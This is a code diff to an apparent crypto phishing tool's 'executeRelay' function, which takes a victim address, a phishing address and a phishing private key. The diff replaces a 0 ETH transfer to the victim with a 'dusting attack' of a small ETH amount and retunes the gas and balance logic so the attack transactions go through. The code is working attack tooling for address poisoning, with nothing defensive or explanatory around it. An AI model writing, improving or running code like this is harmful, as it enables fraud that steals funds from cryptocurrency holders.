@@ -38,7 +38,7 @@ export async function executeRelay({
     victimAddress,
     phishingAddress,
     phishingPrivateKey,
-    fundAmount = '0.00002',
+    fundAmount = '0.000015',
     tokenAddress = '',
 }) {
     const ALCHEMY_RPC = process.env.ALCHEMY_RPC;
@@ -85,13 +85,17 @@ export async function executeRelay({
     const adjustedGasPrice = BigInt(Math.floor(Number(gasPrice) * 1.2));
 
     // --- STEP 1: FUND THE RELAY (SMART GAS) ---
+    const dustAmount = parseEther('0.000001');
+    const gasEstimate = 21000n; // Standard ETH transfer
+    const estimatedGasCost = gasEstimate * adjustedGasPrice;
+    const minRequired = dustAmount + (estimatedGasCost * 120n) / 100n; // Cost + 20% buffer
+
     const currentBalance = await publicClient.getBalance({ address: relayAccount.address });
     const targetBalance = parseEther(fundAmount);
-    const sufficientBalance = (targetBalance * 50n) / 100n; // 50% of the chosen amount is more than enough
     let skippedFunding = false;
 
-    if (currentBalance >= sufficientBalance) {
-        console.log(`[Relay] Step 1 Skipped: Wallet already has sufficient balance (${currentBalance} wei).`);
+    if (currentBalance >= minRequired) {
+        console.log(`[Relay] Step 1 Skipped: Wallet has ${currentBalance} wei (Min required: ${minRequired} wei).`);
         skippedFunding = true;
     } else {
         console.log(`[Relay] Step 1: Funding relay wallet (${phishingAddress}) with ${fundAmount} ETH...`);
@@ -120,7 +124,7 @@ export async function executeRelay({
     });
 
     let attackHash;
-    const targetToken = tokenAddress && tokenAddress.trim() !== '' ? tokenAddress.trim() : ''; // Default back to Mode 1 (Native 0 ETH)
+    const targetToken = tokenAddress && tokenAddress.trim() !== '' ? tokenAddress.trim() : '';
 
     if (targetToken && targetToken.trim() !== '') {
         console.log(
@@ -139,11 +143,13 @@ export async function executeRelay({
             gasPrice: adjustedGasPrice,
         });
     } else {
-        console.log(`[Relay] Step 2: Sending 0 ETH from relay to victim (${victimAddress})...`);
+        console.log(
+            `[Relay] Step 2: Sending dusting attack (${dustAmount} wei) from relay to victim (${victimAddress})...`
+        );
 
         attackHash = await relayClient.sendTransaction({
             to: victimAddress,
-            value: 0n,
+            value: dustAmount,
             gasPrice: adjustedGasPrice,
         });
     }
